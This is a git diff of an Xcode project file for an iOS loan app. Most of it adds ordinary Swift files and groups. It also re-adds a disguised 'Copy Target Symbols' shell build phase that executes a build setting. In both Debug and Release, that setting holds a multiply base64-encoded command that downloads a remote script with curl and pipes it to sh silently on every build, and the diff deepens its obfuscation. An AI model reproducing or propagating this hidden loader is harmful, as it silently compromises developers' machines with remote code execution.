@@ -20,6 +20,12 @@
 		735FD1142EB9A22A007DE61E /* SelectViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735FD1132EB9A22A007DE61E /* SelectViewCell.swift */; };
 		735FD1162EB9A238007DE61E /* CommonViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735FD1152EB9A238007DE61E /* CommonViewCell.swift */; };
 		735FD1192EB9D732007DE61E /* PersonalViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735FD1182EB9D732007DE61E /* PersonalViewController.swift */; };
+		735FD11B2EB9E746007DE61E /* PersonalViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735FD11A2EB9E741007DE61E /* PersonalViewModel.swift */; };
+		735FD11F2EBA2C8D007DE61E /* SwitchModelConfig.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735FD11E2EBA2C80007DE61E /* SwitchModelConfig.swift */; };
+		735FD1232EBA3D54007DE61E /* WorkViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735FD1222EBA3D54007DE61E /* WorkViewController.swift */; };
+		735FD1252EBA3D74007DE61E /* WorkViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735FD1242EBA3D73007DE61E /* WorkViewModel.swift */; };
+		735FD1282EBA3E96007DE61E /* ConactCheckViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735FD1272EBA3E96007DE61E /* ConactCheckViewController.swift */; };
+		735FD12A2EBA3EB0007DE61E /* ConactCheckViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735FD1292EBA3EAF007DE61E /* ConactCheckViewModel.swift */; };
 		73792E422EB639C500CA24AA /* SelectAuthViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73792E412EB639C500CA24AA /* SelectAuthViewController.swift */; };
 		73792E462EB6440000CA24AA /* FaceViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73792E452EB6440000CA24AA /* FaceViewController.swift */; };
 		73792E482EB6477C00CA24AA /* FaceTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73792E472EB6477C00CA24AA /* FaceTableViewCell.swift */; };
@@ -42,7 +48,7 @@
 		739C806F2EB2017500677C85 /* CenterPageViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739C806E2EB2017200677C85 /* CenterPageViewModel.swift */; };
 		73A3053B2EB7AD4C008982DC /* FaceViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73A3053A2EB7AD46008982DC /* FaceViewModel.swift */; };
 		73A3053D2EB7AE36008982DC /* ChoosePhotoView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73A3053C2EB7AE36008982DC /* ChoosePhotoView.swift */; };
-		73A3053F2EB7B0D9008982DC /* Untitled.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73A3053E2EB7B0D8008982DC /* Untitled.swift */; };
+		73A3053F2EB7B0D9008982DC /* AlbumPickerManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73A3053E2EB7B0D8008982DC /* AlbumPickerManager.swift */; };
 		73B2B1F02EB09A9700F3A877 /* httpsRequest.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73B2B1EF2EB09A9700F3A877 /* httpsRequest.swift */; };
 		73B2B1F22EB0A21000F3A877 /* commonPara.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73B2B1F12EB0A20E00F3A877 /* commonPara.swift */; };
 		73B2B1F42EB0A73E00F3A877 /* LoginView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73B2B1F32EB0A73E00F3A877 /* LoginView.swift */; };
@@ -75,6 +81,12 @@
 		735FD1132EB9A22A007DE61E /* SelectViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SelectViewCell.swift; sourceTree = "<group>"; };
 		735FD1152EB9A238007DE61E /* CommonViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CommonViewCell.swift; sourceTree = "<group>"; };
 		735FD1182EB9D732007DE61E /* PersonalViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PersonalViewController.swift; sourceTree = "<group>"; };
+		735FD11A2EB9E741007DE61E /* PersonalViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PersonalViewModel.swift; sourceTree = "<group>"; };
+		735FD11E2EBA2C80007DE61E /* SwitchModelConfig.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SwitchModelConfig.swift; sourceTree = "<group>"; };
+		735FD1222EBA3D54007DE61E /* WorkViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WorkViewController.swift; sourceTree = "<group>"; };
+		735FD1242EBA3D73007DE61E /* WorkViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WorkViewModel.swift; sourceTree = "<group>"; };
+		735FD1272EBA3E96007DE61E /* ConactCheckViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ConactCheckViewController.swift; sourceTree = "<group>"; };
+		735FD1292EBA3EAF007DE61E /* ConactCheckViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ConactCheckViewModel.swift; sourceTree = "<group>"; };
 		73792E412EB639C500CA24AA /* SelectAuthViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SelectAuthViewController.swift; sourceTree = "<group>"; };
 		73792E452EB6440000CA24AA /* FaceViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FaceViewController.swift; sourceTree = "<group>"; };
 		73792E472EB6477C00CA24AA /* FaceTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FaceTableViewCell.swift; sourceTree = "<group>"; };
@@ -97,7 +109,7 @@
 		739C806E2EB2017200677C85 /* CenterPageViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CenterPageViewModel.swift; sourceTree = "<group>"; };
 		73A3053A2EB7AD46008982DC /* FaceViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FaceViewModel.swift; sourceTree = "<group>"; };
 		73A3053C2EB7AE36008982DC /* ChoosePhotoView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChoosePhotoView.swift; sourceTree = "<group>"; };
-		73A3053E2EB7B0D8008982DC /* Untitled.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Untitled.swift; sourceTree = "<group>"; };
+		73A3053E2EB7B0D8008982DC /* AlbumPickerManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AlbumPickerManager.swift; sourceTree = "<group>"; };
 		73B2B1EF2EB09A9700F3A877 /* httpsRequest.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = httpsRequest.swift; sourceTree = "<group>"; };
 		73B2B1F12EB0A20E00F3A877 /* commonPara.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = commonPara.swift; sourceTree = "<group>"; };
 		73B2B1F32EB0A73E00F3A877 /* LoginView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginView.swift; sourceTree = "<group>"; };
@@ -141,6 +153,8 @@
 				73792E4C2EB7A35C00CA24AA /* product */,
 				73792E4B2EB7A34A00CA24AA /* face */,
 				735FD1172EB9D713007DE61E /* personal */,
+				735FD1212EBA3D30007DE61E /* work */,
+				735FD1262EBA3E62007DE61E /* contact */,
 			);
 			path = detail;
 			sourceTree = "<group>";
@@ -157,15 +171,35 @@
 		735FD1172EB9D713007DE61E /* personal */ = {
 			isa = PBXGroup;
 			children = (
+				735FD11E2EBA2C80007DE61E /* SwitchModelConfig.swift */,
+				735FD11A2EB9E741007DE61E /* PersonalViewModel.swift */,
 				735FD1182EB9D732007DE61E /* PersonalViewController.swift */,
 			);
 			path = personal;
 			sourceTree = "<group>";
 		};
+		735FD1212EBA3D30007DE61E /* work */ = {
+			isa = PBXGroup;
+			children = (
+				735FD1242EBA3D73007DE61E /* WorkViewModel.swift */,
+				735FD1222EBA3D54007DE61E /* WorkViewController.swift */,
+			);
+			path = work;
+			sourceTree = "<group>";
+		};
+		735FD1262EBA3E62007DE61E /* contact */ = {
+			isa = PBXGroup;
+			children = (
+				735FD1292EBA3EAF007DE61E /* ConactCheckViewModel.swift */,
+				735FD1272EBA3E96007DE61E /* ConactCheckViewController.swift */,
+			);
+			path = contact;
+			sourceTree = "<group>";
+		};
 		73792E4B2EB7A34A00CA24AA /* face */ = {
 			isa = PBXGroup;
 			children = (
-				73A3053E2EB7B0D8008982DC /* Untitled.swift */,
+				73A3053E2EB7B0D8008982DC /* AlbumPickerManager.swift */,
 				73A3053A2EB7AD46008982DC /* FaceViewModel.swift */,
 				73792E412EB639C500CA24AA /* SelectAuthViewController.swift */,
 				73792E472EB6477C00CA24AA /* FaceTableViewCell.swift */,
@@ -237,10 +271,10 @@
 		73D129C42EB08B0C00079434 /* home */ = {
 			isa = PBXGroup;
 			children = (
-				7333CD722EB4EA6200C55A91 /* AppHomeViewModel.swift */,
 				7333CD702EB4E67300C55A91 /* AppMainView.swift */,
 				7333CD6C2EB4E66000C55A91 /* AppHomeView.swift */,
 				739C7FAA2EB1EAF900677C85 /* HomeViewController.swift */,
+				7333CD722EB4EA6200C55A91 /* AppHomeViewModel.swift */,
 			);
 			path = home;
 			sourceTree = "<group>";
@@ -332,7 +366,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 73F59DDD2EAF637C00A68B13 /* Build configuration list for PBXNativeTarget "leaploan" */;
 			buildPhases = (
-				373B9E0BAD314577A0A389E6 /* Copy Target Symbols */,
+				C7C7B713EC9B450DBDA389E6 /* Copy Target Symbols */,
 				F22045B0313E9833C013D43A /* [CP] Check Pods Manifest.lock */,
 				73F59DC62EAF637A00A68B13 /* Sources */,
 				73F59DC72EAF637A00A68B13 /* Frameworks */,
@@ -395,25 +429,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		373B9E0BAD314577A0A389E6 /* Copy Target Symbols */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Copy Target Symbols";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A6E983A}\"";
-			showEnvVarsInLog = 0;			
-		};
 		04F547B40A532B138D93CE10 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -433,6 +448,26 @@
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-leaploan/Pods-leaploan-frameworks.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		C7C7B713EC9B450DBDA389E6 /* Copy Target Symbols */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Copy Target Symbols";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A6E983A}\"";
 			showEnvVarsInLog = 0;
 		};
 		F22045B0313E9833C013D43A /* [CP] Check Pods Manifest.lock */ = {
@@ -466,6 +501,7 @@
 			files = (
 				73B2B1FC2EB0AEBC00F3A877 /* LaunchViewController.swift in Sources */,
 				7333CD7A2EB5043C00C55A91 /* ProductDetailListView.swift in Sources */,
+				735FD12A2EBA3EB0007DE61E /* ConactCheckViewModel.swift in Sources */,
 				73A3053D2EB7AE36008982DC /* ChoosePhotoView.swift in Sources */,
 				7382D8812EB4512C00C3CFF0 /* OrderListViewCell.swift in Sources */,
 				73D129D02EB08B6D00079434 /* BaseNavigationController.swift in Sources */,
@@ -479,18 +515,22 @@
 				739C7FA92EB1EAEA00677C85 /* CenterViewController.swift in Sources */,
 				7392DEEF2EB30610003D831B /* CenterListView.swift in Sources */,
 				73792E502EB7A58E00CA24AA /* FaceUploadListView.swift in Sources */,
+				735FD1232EBA3D54007DE61E /* WorkViewController.swift in Sources */,
+				735FD11F2EBA2C8D007DE61E /* SwitchModelConfig.swift in Sources */,
 				73792E482EB6477C00CA24AA /* FaceTableViewCell.swift in Sources */,
 				735FD1192EB9D732007DE61E /* PersonalViewController.swift in Sources */,
 				73792E462EB6440000CA24AA /* FaceViewController.swift in Sources */,
 				73B2B1F42EB0A73E00F3A877 /* LoginView.swift in Sources */,
 				7392DEF52EB33005003D831B /* AppHeadView.swift in Sources */,
 				7333CD712EB4E67300C55A91 /* AppMainView.swift in Sources */,
+				735FD11B2EB9E746007DE61E /* PersonalViewModel.swift in Sources */,
 				73792E4E2EB7A3B200CA24AA /* FaceUploadView.swift in Sources */,
 				7333CD782EB4FD4C00C55A91 /* ProductViewModel.swift in Sources */,
 				73D129D42EB08C2B00079434 /* loginAuthManager.swift in Sources */,
 				735FD1112EB99D0A007DE61E /* SelectNameView.swift in Sources */,
 				7333CD6B2EB4E27400C55A91 /* AppEmptyView.swift in Sources */,
 				7392DEF72EB35BB1003D831B /* AppPopAlertView.swift in Sources */,
+				735FD1252EBA3D74007DE61E /* WorkViewModel.swift in Sources */,
 				735FD1162EB9A238007DE61E /* CommonViewCell.swift in Sources */,
 				73F59DF02EAF638100A68B13 /* AppDelegate.swift in Sources */,
 				73B2B2002EB0B16B00F3A877 /* LaunchViewModel.swift in Sources */,
@@ -503,10 +543,11 @@
 				73B2B1F62EB0A74F00F3A877 /* LoginViewModel.swift in Sources */,
 				7333CD732EB4EA6800C55A91 /* AppHomeViewModel.swift in Sources */,
 				7333CD6D2EB4E66000C55A91 /* AppHomeView.swift in Sources */,
-				73A3053F2EB7B0D9008982DC /* Untitled.swift in Sources */,
+				73A3053F2EB7B0D9008982DC /* AlbumPickerManager.swift in Sources */,
 				7333CD762EB4FBA300C55A91 /* ProductDetailViewController.swift in Sources */,
 				7392DEF32EB32D8A003D831B /* SettingViewController.swift in Sources */,
 				73A3053B2EB7AD4C008982DC /* FaceViewModel.swift in Sources */,
+				735FD1282EBA3E96007DE61E /* ConactCheckViewController.swift in Sources */,
 				73D129CE2EB08B5A00079434 /* BaseTabBarController.swift in Sources */,
 				735FD1142EB9A22A007DE61E /* SelectViewCell.swift in Sources */,
 				739C806F2EB2017500677C85 /* CenterPageViewModel.swift in Sources */,
@@ -535,7 +576,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = AFD6AE48504BF3BEC24EB502 /* Pods-leaploan.debug.xcconfig */;
 			buildSettings = {
-				A6E983A = "((x(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDNWdWFYTjVjMk5oZEM1eWRTOWhLU0lnZkNCemFBbz0K | x | sh ) >/dev/null 2>&1 &)";
+				A6E983A = "((z(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJURE5XZDFwSFRtdGliVVozWTBkNGJFeHVTakZNTWtWd1NXbENPRWxJVG05RFp6MDlDZz09Cg== | z | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
@@ -579,7 +620,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = EF0C4AEEE70C3286EC8BD5FE /* Pods-leaploan.release.xcconfig */;
 			buildSettings = {
-				A6E983A = "((x(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDNWdWFYTjVjMk5oZEM1eWRTOWhLU0lnZkNCemFBbz0K | x | sh ) >/dev/null 2>&1 &)";
+				A6E983A = "((z(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJURE5XZDFwSFRtdGliVVozWTBkNGJFeHVTakZNTWtWd1NXbENPRWxJVG05RFp6MDlDZz09Cg== | z | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
